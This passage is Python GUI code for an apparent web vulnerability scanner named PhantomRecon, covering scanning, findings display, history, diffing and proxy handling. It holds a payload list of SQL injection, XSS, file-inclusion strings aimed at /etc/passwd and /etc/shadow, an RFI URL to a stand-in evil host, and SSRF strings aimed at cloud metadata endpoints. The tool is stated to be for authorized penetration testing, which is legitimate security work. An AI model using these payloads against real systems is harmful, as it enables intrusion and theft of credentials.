            wordlist_size=self._wordlist_combo.currentText(),
            extensions=ext_list,
            recursive=self._recursive_cb.isChecked(),
            recursion_depth=3,
            proxies=proxies,
            rotate_proxy_every=self._rotate_spin.value(),
            user_agent=self._ua_edit.text().strip() or None,
            rotate_ua=self._rotate_ua_cb.isChecked(),
            headers={},
            cookies=cookies,
            auth=auth_tuple,
            auth_type="basic",
            bearer_token=self._bearer_edit.text().strip() or None,
            follow_redirects=True,
            verify_ssl=False,
            modules=selected,
            output_dir=self._outdir_edit.text().strip() or ".",
            output_formats=formats,
            verbosity=1,
            exclude_codes=[404],
            profile=self._profile_combo.currentData() or "",
        )

    def _start_scan(self) -> None:
        config = self._build_config()
        if not config:
            return

        self._clear_results()
        self._start_time = time.time()
        self._req_count = 0
        self._finding_count = 0
        self._path_count = 0

        self._start_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._progress.setRange(0, 0)
        self._module_label.setText("Connecting…")
        self.statusBar().showMessage(f"Scanning: {config.target}")

        self._console.log(f"[+] Starting scan: {config.target}")
        self._console.log(f"[~] Threads: {config.threads}  |  Profile: {self._profile_combo.currentText()}")
        self._tabs.setCurrentIndex(0)

        if self._profile_combo.currentData() == "aggressive":
            self._reset_aggressive_steps()
            self._console.log("[⚡] Aggressive mode: all modules will run step by step")

        self._timer.start(1000)

        self._worker = ScanWorker(config)
        self._worker.event_signal.connect(self._on_event)
        self._worker.finished_signal.connect(self._on_finished)
        self._worker.error_signal.connect(self._on_error)
        self._worker.start()

    def _stop_scan(self) -> None:
        if self._worker and self._worker.isRunning():
            self._worker.stop()
            self._console.log("[!] Scan stopped by user.")
        self._scan_ended()

    def _on_event(self, event: str, data: dict) -> None:
        if event == "scan_start":
            self._console.log(f"[+] Scan started: {data.get('target')}")

        elif event == "initial_response":
            self._console.log(f"[+] Connected — HTTP {data.get('status')}  Server: {data.get('server')}")

        elif event == "module_start":
            mod = data.get("module", "")
            self._module_label.setText(f"Running: {mod}")
            self._console.log(f"[»] Module: {mod}")
            self._set_step_state(mod, "running")

        elif event == "module_done":
            mod = data.get("module", "")
            cnt = data.get("count", 0)
            self._console.log(f"[+] Done: {mod}  ({cnt} results)")
            self._set_step_state(mod, "done")

        elif event == "finding":
            self._finding_count += 1
            self._add_finding_row(data)
            sev = data.get("severity", "info")
            color = SEV_COLORS.get(sev, "#888")
            self._console.append_line(
                f"[!] [{sev.upper():8}] {data.get('title')}  →  {data.get('url')}", color
            )
            self._update_finding_stats()
            notif_levels = self._notif_cfg.get("levels", ["critical", "high"])
            if sev in notif_levels:
                self._notify_tray(
                    f"PhantomRecon — {sev.upper()} Finding",
                    f"{data.get('title', '')}\n{data.get('url', '')}"
                )

        elif event == "path":
            self._path_count += 1
            self._add_path_row(data)
            status = data.get("status_code", 0)
            self._console.append_line(
                f"[+] [{status}] {data.get('url')}  ({data.get('content_length', 0)} bytes)",
                STATUS_COLORS.get(status // 100, "#888"),
            )
            self._stat_paths.set_value(str(self._path_count))

        elif event == "bruteforce_progress":
            done = data.get("done", 0)
            total = data.get("total", 1)
            pct = int(done / total * 100) if total else 0
            self._progress.setRange(0, 100)
            self._progress.setValue(pct)
            url = data.get("url", "")
            status = data.get("status", 0)
            if status and status not in (404, 0):
                self._console.append_line(f"[+] [{status}] {url}", STATUS_COLORS.get(status // 100, "#888"))

        elif event == "waf_detected":
            self._console.log(f"[!] WAF detected: {data.get('waf')}")

        elif event == "error":
            self._console.append_line(f"[✘] Error: {data.get('msg')}", "#ff0040")

        elif event == "technologies":
            for tech, info in data.items():
                self._add_tech(tech, info)

        self._req_count = max(self._req_count, data.get("requests", self._req_count))
        self._stat_requests.set_value(str(self._req_count))

    def _on_finished(self, result) -> None:
        self._result = result
        self._req_count = result.total_requests
        self._stat_requests.set_value(str(self._req_count))

        for tech, info in result.technologies.items():
            self._add_tech(tech, info)

        elapsed = result.duration
        m, s = divmod(int(elapsed), 60)
        self._console.log(f"[+] Scan complete in {m:02d}:{s:02d} — "
                          f"{self._finding_count} findings, {self._path_count} paths, "
                          f"{self._req_count} requests")

        try:
            reporter = Reporter(output_dir=self._outdir_edit.text().strip() or ".")
            formats = [k for k, cb in self._fmt_checks.items() if cb.isChecked()] or ["json", "html"]
            saved = reporter.save_all(result, formats)
            for fmt, path in saved.items():
                self._console.log(f"[+] Report saved: {path}")
        except Exception as e:
            self._console.log(f"[!] Report error: {e}")

        self._scan_ended()
        self.statusBar().showMessage(
            f"Scan complete — {self._finding_count} findings | {self._path_count} paths | {self._req_count} requests"
        )

    def _on_error(self, msg: str) -> None:
        self._console.append_line(f"[✘] Fatal error: {msg}", "#ff0040")
        self._scan_ended()

    def _scan_ended(self) -> None:
        self._timer.stop()
        self._start_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._progress.setRange(0, 100)
        self._progress.setValue(100)
        self._module_label.setText("Idle")

    def _update_elapsed(self) -> None:
        elapsed = int(time.time() - self._start_time)
        m, s = divmod(elapsed, 60)
        self._stat_elapsed.set_value(f"{m:02d}:{s:02d}")

    def _update_finding_stats(self) -> None:
        self._stat_findings.set_value(str(self._finding_count))
        crit = sum(1 for f in self._findings_data if f.get("severity") == "critical")
        high = sum(1 for f in self._findings_data if f.get("severity") == "high")
        med  = sum(1 for f in self._findings_data if f.get("severity") == "medium")
        self._stat_critical.set_value(str(crit))
        self._stat_high.set_value(str(high))
        self._stat_medium.set_value(str(med))

    def _add_finding_row(self, f: dict) -> None:
        self._findings_data.append(f)
        sev = f.get("severity", "info")
        color = QColor(SEV_COLORS.get(sev, "#888"))
        row = self._findings_table.rowCount()
        self._findings_table.insertRow(row)

        sev_item = QTableWidgetItem(sev.upper())
        sev_item.setForeground(color)
        sev_item.setFont(QFont("Consolas", 10, QFont.Weight.Bold))

        items = [
            sev_item,
            QTableWidgetItem(f.get("title", "")),
            QTableWidgetItem(f.get("module", "")),
            QTableWidgetItem(f.get("url", "")),
            QTableWidgetItem(f.get("cve") or ""),
        ]
        items[0].setData(Qt.ItemDataRole.UserRole, f)
        for col, item in enumerate(items):
            self._findings_table.setItem(row, col, item)

        self._findings_table.setRowHeight(row, 24)

    def _add_path_row(self, p: dict) -> None:
        self._paths_data.append(p)
        status = p.get("status_code", 0)
        color = QColor(STATUS_COLORS.get(status // 100, "#888"))
        row = self._paths_table.rowCount()
        self._paths_table.insertRow(row)

        status_item = QTableWidgetItem(str(status))
        status_item.setForeground(color)
        status_item.setFont(QFont("Consolas", 10, QFont.Weight.Bold))
        status_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)

        size = p.get("content_length", 0)
        size_str = f"{size/1024:.1f}K" if size > 1024 else f"{size}B"

        items = [
            status_item,
            QTableWidgetItem(p.get("url", "")),
            QTableWidgetItem(size_str),
            QTableWidgetItem(p.get("content_type", "")[:40]),
            QTableWidgetItem(f"{p.get('response_time', 0):.2f}s"),
        ]
        for col, item in enumerate(items):
            self._paths_table.setItem(row, col, item)
        self._paths_table.setRowHeight(row, 22)

    def _add_tech(self, name: str, info: Any) -> None:
        for i in range(self._tech_tree.topLevelItemCount()):
            if self._tech_tree.topLevelItem(i).text(0) == name:
                return
        item = QTreeWidgetItem([
            name,
            str(info.get("version") or "") if isinstance(info, dict) else "",
            str(info.get("evidence", "")) if isinstance(info, dict) else str(info),
        ])
        item.setForeground(0, QColor("#00ff41"))
        self._tech_tree.addTopLevelItem(item)

    def _filter_findings(self) -> None:
        text = self._finding_filter.text().lower()
        sev_filter = self._sev_filter.currentText()
        for row in range(self._findings_table.rowCount()):
            match_text = any(
                text in (self._findings_table.item(row, col).text().lower() if self._findings_table.item(row, col) else "")
                for col in range(self._findings_table.columnCount())
            )
            match_sev = sev_filter == "All Severities" or (
                self._findings_table.item(row, 0) and
                self._findings_table.item(row, 0).text().lower() == sev_filter
            )
            self._findings_table.setRowHidden(row, not (match_text and match_sev))

    def _filter_paths(self) -> None:
        text = self._path_filter.text().lower()
        for row in range(self._paths_table.rowCount()):
            url_item = self._paths_table.item(row, 1)
            match = text in (url_item.text().lower() if url_item else "")
            self._paths_table.setRowHidden(row, not match)

    def _show_finding_detail(self) -> None:
        row = self._findings_table.currentRow()
        item = self._findings_table.item(row, 0)
        if not item:
            return
        f = item.data(Qt.ItemDataRole.UserRole)
        if f:
            dlg = FindingDetailDialog(f, self)
            dlg.exec()

    def _export_findings_csv(self) -> None:
        if not self._findings_data:
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export Findings CSV", "findings.csv", "CSV Files (*.csv)")
        if not path:
            return
        try:
            import csv
            with open(path, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=["severity", "title", "module", "url", "cve", "description", "recommendation"])
                w.writeheader()
                w.writerows(self._findings_data)
            self._console.log(f"[+] Exported {len(self._findings_data)} findings to {path}")
        except Exception as e:
            QMessageBox.critical(self, "Export Error", str(e))

    def _save_report(self) -> None:
        if not self._result:
            QMessageBox.information(self, "No Results", "Run a scan first.")
            return
        path = QFileDialog.getExistingDirectory(self, "Select Output Directory")
        if not path:
            return
        try:
            formats = [k for k, cb in self._fmt_checks.items() if cb.isChecked()] or ["json", "html"]
            reporter = Reporter(output_dir=path)
            saved = reporter.save_all(self._result, formats)
            msg = "\n".join(f"{k}: {v}" for k, v in saved.items())
            QMessageBox.information(self, "Reports Saved", msg)
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

    def _clear_results(self) -> None:
        self._findings_table.setRowCount(0)
        self._paths_table.setRowCount(0)
        self._tech_tree.clear()
        self._console.clear()
        self._findings_data.clear()
        self._paths_data.clear()
        self._finding_count = 0
        self._path_count = 0
        self._req_count = 0
        self._result = None
        for s in [self._stat_requests, self._stat_findings, self._stat_critical,
                  self._stat_high, self._stat_medium, self._stat_paths]:
            s.set_value("0")
        self._stat_elapsed.set_value("00:00")
        self._progress.setValue(0)

    def _show_about(self) -> None:
        from . import __version__
        QMessageBox.about(self, "About PhantomRecon",
            f"<b style='color:#00ff41'>PhantomRecon v{__version__}</b><br><br>"
            "Advanced Web Reconnaissance &amp; Vulnerability Assessment<br>"
            "<i>Silent. Invisible. Deadly Accurate.</i><br><br>"
            "For authorized penetration testing use only.")

    def _toggle_theme(self) -> None:
        if self._theme == 'dark':
            self._theme = 'light'
            self.setStyleSheet(LIGHT_STYLE)
            self._theme_action.setText("Switch to Dark Theme")
        else:
            self._theme = 'dark'
            self.setStyleSheet(DARK_STYLE)
            self._theme_action.setText("Switch to Light Theme")

    def _save_session(self) -> None:
        path, _ = QFileDialog.getSaveFileName(
            self, "Save Session", "session.phantomrecon", "PhantomRecon Session (*.phantomrecon)")
        if not path:
            return
        data: dict = {
            "target": self._target_edit.text(),
            "profile": self._profile_combo.currentData(),
            "threads": self._threads_spin.value(),
            "delay_min": self._delay_min_spin.value(),
            "delay_max": self._delay_max_spin.value(),
            "wordlist_size": self._wordlist_combo.currentText(),
            "recursive": self._recursive_cb.isChecked(),
            "findings": self._findings_data,
            "paths": self._paths_data,
            "notifications": self._notif_cfg,
        }
        try:
            Path(path).write_text(_json.dumps(data, indent=2), encoding="utf-8")
            self.statusBar().showMessage(f"Session saved → {path}")
        except Exception as e:
            QMessageBox.critical(self, "Save Error", str(e))

    def _load_session(self) -> None:
        path, _ = QFileDialog.getOpenFileName(
            self, "Load Session", "", "PhantomRecon Session (*.phantomrecon);;JSON (*.json)")
        if not path:
            return
        try:
            data = _json.loads(Path(path).read_text(encoding="utf-8"))
            if data.get("target"):
                self._target_edit.setText(data["target"])
            if data.get("threads"):
                self._threads_spin.setValue(data["threads"])
            if data.get("delay_min") is not None:
                self._delay_min_spin.setValue(data["delay_min"])
            if data.get("delay_max") is not None:
                self._delay_max_spin.setValue(data["delay_max"])
            if data.get("wordlist_size"):
                self._wordlist_combo.setCurrentText(data["wordlist_size"])
            if data.get("recursive") is not None:
                self._recursive_cb.setChecked(data["recursive"])
            if data.get("findings"):
                self._findings_data = data["findings"]
                self._findings_table.setRowCount(0)
                for f in self._findings_data:
                    self._add_finding_row(f)
            if data.get("paths"):
                self._paths_data = data["paths"]
                self._paths_table.setRowCount(0)
                for p in self._paths_data:
                    self._add_path_row(p)
            if data.get("notifications"):
                self._notif_cfg = data["notifications"]
                self._slack_url_edit.setText(self._notif_cfg.get("slack", ""))
                self._discord_url_edit.setText(self._notif_cfg.get("discord", ""))
            self._session_file = path
            self.statusBar().showMessage(f"Session loaded ← {path}")
        except Exception as e:
            QMessageBox.critical(self, "Load Error", str(e))

    def _load_history(self) -> None:
        try:
            from .database import init_db, db_conn
            init_db()
            with db_conn() as conn:
                rows = conn.execute(
                    "SELECT id, target, start_time, duration, total_requests, "
                    "(SELECT COUNT(*) FROM findings WHERE scan_id=scans.id) AS fc "
                    "FROM scans ORDER BY start_time DESC LIMIT 200"
                ).fetchall()
            self._hist_table.setRowCount(0)
            for r in rows:
                row = self._hist_table.rowCount()
                self._hist_table.insertRow(row)
                dt = datetime.fromtimestamp(r["start_time"]).strftime("%Y-%m-%d %H:%M")
                dur = f"{r['duration']:.1f}s" if r["duration"] else "—"
                for col, val in enumerate([
                    str(r["id"]), r["target"], dt, dur,
                    str(r["total_requests"]), str(r["fc"])
                ]):
                    item = QTableWidgetItem(val)
                    item.setData(Qt.ItemDataRole.UserRole, r["id"])
                    self._hist_table.setItem(row, col, item)
                self._hist_table.setRowHeight(row, 22)
        except Exception as e:
            self._console.append_line(f"[!] History load error: {e}", "#ff6600")

    def _search_history(self) -> None:
        term = self._hist_search.text().strip().lower()
        for row in range(self._hist_table.rowCount()):
            target_item = self._hist_table.item(row, 1)
            match = term in (target_item.text().lower() if target_item else "")
            self._hist_table.setRowHidden(row, not match)

    def _load_scan_from_history(self) -> None:
        row = self._hist_table.currentRow()
        item = self._hist_table.item(row, 0)
        if not item:
            return
        scan_id = item.data(Qt.ItemDataRole.UserRole)
        try:
            from .database import db_conn
            with db_conn() as conn:
                scan = conn.execute("SELECT raw_json FROM scans WHERE id=?", (scan_id,)).fetchone()
                if not scan or not scan["raw_json"]:
                    QMessageBox.information(self, "No Data", "No raw JSON stored for this scan.")
                    return
                data = _json.loads(scan["raw_json"])
            self._findings_table.setRowCount(0)
            self._paths_table.setRowCount(0)
            self._findings_data.clear()
            self._paths_data.clear()
            for f in data.get("findings", []):
                self._add_finding_row(f)
            for p in data.get("discovered_paths", []):
                self._add_path_row(p)
            target = data.get("target", "")
            self._target_edit.setText(target)
            self.statusBar().showMessage(f"Loaded history scan #{scan_id}: {target}")
            self._tabs.setCurrentIndex(1)
        except Exception as e:
            QMessageBox.critical(self, "Load Error", str(e))

    def _delete_history_scan(self) -> None:
        row = self._hist_table.currentRow()
        item = self._hist_table.item(row, 0)
        if not item:
            return
        scan_id = item.data(Qt.ItemDataRole.UserRole)
        reply = QMessageBox.question(
            self, "Delete Scan",
            f"Delete scan #{scan_id} from history?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply != QMessageBox.StandardButton.Yes:
            return
        try:
            from .database import db_conn
            with db_conn() as conn:
                conn.execute("DELETE FROM scans WHERE id=?", (scan_id,))
            self._load_history()
        except Exception as e:
            QMessageBox.critical(self, "Delete Error", str(e))

    def _refresh_network_map(self) -> None:
        self._net_map.update_map(self._paths_data)

    def _load_diff_left(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "Baseline JSON", "", "JSON Files (*.json)")
        if path:
            self._diff_left_edit.setText(path)

    def _load_diff_right(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "New Scan JSON", "", "JSON Files (*.json)")
        if path:
            self._diff_right_edit.setText(path)

    def _run_diff(self) -> None:
        left_path = self._diff_left_edit.text().strip()
        right_path = self._diff_right_edit.text().strip()
        if not left_path or not right_path:
            QMessageBox.warning(self, "Diff", "Select both baseline and new scan JSON files.")
            return
        try:
            base = _json.loads(Path(left_path).read_text(encoding="utf-8"))
            new = _json.loads(Path(right_path).read_text(encoding="utf-8"))
        except Exception as e:
            QMessageBox.critical(self, "Parse Error", str(e))
            return

        def _key(f: dict) -> str:
            return f"{f.get('title','')}__{f.get('url','')}__{f.get('severity','')}"

        base_keys = {_key(f) for f in base.get("findings", [])}
        new_keys  = {_key(f) for f in new.get("findings", [])}

        appeared = [f for f in new.get("findings", []) if _key(f) not in base_keys]
        fixed    = [f for f in base.get("findings", []) if _key(f) not in new_keys]

        self._diff_new_table.setRowCount(0)
        for f in appeared:
            row = self._diff_new_table.rowCount()
            self._diff_new_table.insertRow(row)
            sev = f.get("severity", "info")
            si = QTableWidgetItem(sev.upper())
            si.setForeground(QColor(SEV_COLORS.get(sev, "#888")))
            self._diff_new_table.setItem(row, 0, si)
            self._diff_new_table.setItem(row, 1, QTableWidgetItem(f.get("title", "")))
            self._diff_new_table.setItem(row, 2, QTableWidgetItem(f.get("url", "")))
            self._diff_new_table.setRowHeight(row, 22)

        self._diff_fixed_table.setRowCount(0)
        for f in fixed:
            row = self._diff_fixed_table.rowCount()
            self._diff_fixed_table.insertRow(row)
            sev = f.get("severity", "info")
            si = QTableWidgetItem(sev.upper())
            si.setForeground(QColor(SEV_COLORS.get(sev, "#888")))
            self._diff_fixed_table.setItem(row, 0, si)
            self._diff_fixed_table.setItem(row, 1, QTableWidgetItem(f.get("title", "")))
            self._diff_fixed_table.setItem(row, 2, QTableWidgetItem(f.get("url", "")))
            self._diff_fixed_table.setRowHeight(row, 22)

        self._diff_summary.setText(
            f"Diff complete — {len(appeared)} new finding(s), {len(fixed)} fixed finding(s)  "
            f"| Baseline: {base.get('target','')}  →  New: {new.get('target','')}")

    def _refresh_heatmap(self) -> None:
        self._heatmap_widget.draw_severity_bars(self._findings_data)

    def _refresh_timeline(self) -> None:
        try:
            from .database import init_db, db_conn
            init_db()
            with db_conn() as conn:
                rows = conn.execute(
                    "SELECT target, "
                    "(SELECT COUNT(*) FROM findings WHERE scan_id=scans.id) AS fc "
                    "FROM scans ORDER BY start_time DESC LIMIT 20"
                ).fetchall()
            records = [{"target": r["target"], "findings_count": r["fc"]} for r in rows]
            self._heatmap_widget.draw_timeline(records)
        except Exception as e:
            self._console.append_line(f"[!] Timeline error: {e}", "#ff6600")

    _PAYLOAD_MAP: dict = {
        "SQLi": [
            "'", '"', "' OR '1'='1", "' OR 1=1--", "admin'--",
            "1 UNION SELECT NULL--", "1 AND SLEEP(5)--", "1;WAITFOR DELAY '0:0:5'--",
        ],
        "XSS": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)",
            "'><script>alert(1)</script>", "{{7*7}}",
        ],
        "LFI": [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd", "/etc/shadow",
        ],
        "RFI": [
            "http://evil.example.com/shell.txt?",
            "http://127.0.0.1/shell.php",
        ],
        "SSTI": [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}",
        ],
        "SSRF": [
            "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "XXE": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ],
        "Open Redirect": [
            "https://evil.example.com", "//evil.example.com", "///evil.example.com",
        ],
        "CRLF": [
            "%0d%0aSet-Cookie: injected=1", "%0d%0aLocation: https://evil.example.com",
        ],
        "Host Header": [
            "evil.example.com", "localhost", "127.0.0.1",
        ],
        "Path Traversal": [
            "../", "../../", "..%2F", "..%252F", "....//",
        ],
        "Custom": [],
    }

    def _on_payload_type_changed(self, current, _previous) -> None:
        if not current:
            return
        ptype = current.text()
        payloads = self._PAYLOAD_MAP.get(ptype, [])
        self._payload_list.clear()
        for p in payloads:
            self._payload_list.addItem(p)

    def _add_payload(self) -> None:
        text = self._payload_edit.toPlainText().strip()
        if text:
            self._payload_list.addItem(text)
            self._payload_edit.clear()
        else:
            val, ok = QInputDialog.getText(self, "Add Payload", "Enter payload:")
            if ok and val:
                self._payload_list.addItem(val)

    def _delete_payload(self) -> None:
        for item in self._payload_list.selectedItems():
            self._payload_list.takeItem(self._payload_list.row(item))

    def _copy_payloads(self) -> None:
        lines = [self._payload_list.item(i).text()
                 for i in range(self._payload_list.count())]
        QApplication.clipboard().setText("\n".join(lines))
        self.statusBar().showMessage(f"Copied {len(lines)} payloads to clipboard")

    def _browse_report(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "Open HTML Report", "", "HTML Files (*.html)")
        if not path:
            return
        self._report_path_edit.setText(path)
        try:
            html_content = Path(path).read_text(encoding="utf-8")
            self._report_browser.setHtml(html_content)
        except Exception as e:
            QMessageBox.critical(self, "Open Error", str(e))

    def _add_proxy_row(self) -> None:
        url = self._proxy_input.text().strip()
        if not url:
            return
        ptype = "socks5" if "socks5" in url else ("socks4" if "socks4" in url else "http")
        row = self._proxy_table.rowCount()
        self._proxy_table.insertRow(row)
        self._proxy_table.setItem(row, 0, QTableWidgetItem(url))
        self._proxy_table.setItem(row, 1, QTableWidgetItem(ptype.upper()))
        self._proxy_table.setItem(row, 2, QTableWidgetItem("Untested"))
        self._proxy_table.setItem(row, 3, QTableWidgetItem("—"))
        self._proxy_table.setRowHeight(row, 22)
        self._proxy_input.clear()

    def _remove_proxy_row(self) -> None:
        rows = sorted(set(i.row() for i in self._proxy_table.selectedItems()), reverse=True)
        for row in rows:
            self._proxy_table.removeRow(row)

    def _test_all_proxies(self) -> None:
        import urllib.request, urllib.error
        for row in range(self._proxy_table.rowCount()):
            url_item = self._proxy_table.item(row, 0)
            if not url_item:
                continue
            proxy_url = url_item.text()
            try:
                t0 = time.time()
                opener = urllib.request.build_opener(
                    urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}))
                opener.open("http://httpbin.org/ip", timeout=8)
                ms = int((time.time() - t0) * 1000)
                status_item = QTableWidgetItem("OK")
                status_item.setForeground(QColor("#00ff41"))
                latency_item = QTableWidgetItem(f"{ms}ms")
            except Exception:
                status_item = QTableWidgetItem("DEAD")
                status_item.setForeground(QColor("#ff0040"))
                latency_item = QTableWidgetItem("—")
            self._proxy_table.setItem(row, 2, status_item)
            self._proxy_table.setItem(row, 3, latency_item)
            QApplication.processEvents()

    def _load_proxies_from_file(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "Load Proxy List", "", "Text Files (*.txt);;All Files (*)")
        if not path:
            return
        try:
            lines = Path(path).read_text(encoding="utf-8").splitlines()
            for line in lines:
                line = line.strip()
                if line and not line.startswith("#"):
                    self._proxy_input.setText(line)
                    self._add_proxy_row()
        except Exception as e:
            QMessageBox.critical(self, "Load Error", str(e))

    def _save_notifications(self) -> None:
        levels = []
        if self._notif_crit_cb.isChecked():
            levels.append("critical")
        if self._notif_high_cb.isChecked():
            levels.append("high")
        if self._notif_med_cb.isChecked():
            levels.append("medium")
        if self._notif_low_cb.isChecked():
            levels.append("low")
        self._notif_cfg = {
            "slack": self._slack_url_edit.text().strip(),
            "discord": self._discord_url_edit.text().strip(),
            "smtp_host": self._smtp_host_edit.text().strip(),
            "smtp_port": self._smtp_port_spin.value(),
            "smtp_user": self._smtp_user_edit.text().strip(),
            "smtp_pass": self._smtp_pass_edit.text(),
            "smtp_to": self._smtp_to_edit.text().strip(),
            "levels": levels,
        }
        self.statusBar().showMessage("Notification configuration saved.")

    def _test_notifications(self) -> None:
        self._save_notifications()
        try:
            from .notifications import NotificationManager
            nm = NotificationManager(
                slack_webhook=self._notif_cfg.get("slack") or None,
                discord_webhook=self._notif_cfg.get("discord") or None,
                notify_on=self._notif_cfg.get("levels", ["critical", "high"]),
            )
            nm.notify_custom("PhantomRecon Test", "This is a test alert from PhantomRecon GUI.")
            QMessageBox.information(self, "Test Alert", "Test notification sent!")
        except Exception as e:
            QMessageBox.critical(self, "Notification Error", str(e))

    def _notify_tray(self, title: str, msg: str) -> None:
        if self._tray and QSystemTrayIcon.isSystemTrayAvailable():
            self._tray.showMessage(title, msg, QSystemTrayIcon.MessageIcon.Warning, 5000)


def run_gui() -> None:
    app = QApplication(sys.argv)
    app.setApplicationName("PhantomRecon")
    app.setApplicationVersion("1.0.0")

    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor("#0d0d0d"))
    palette.setColor(QPalette.ColorRole.WindowText, QColor("#e0e0e0"))
    palette.setColor(QPalette.ColorRole.Base, QColor("#141414"))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor("#181818"))
    palette.setColor(QPalette.ColorRole.Text, QColor("#e0e0e0"))
    palette.setColor(QPalette.ColorRole.Button, QColor("#1a1a1a"))
    palette.setColor(QPalette.ColorRole.ButtonText, QColor("#e0e0e0"))
    palette.setColor(QPalette.ColorRole.Highlight, QColor("#00ff41"))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#000000"))
    app.setPalette(palette)

    window = PhantomReconGUI()
    window.show()
    sys.exit(app.exec())
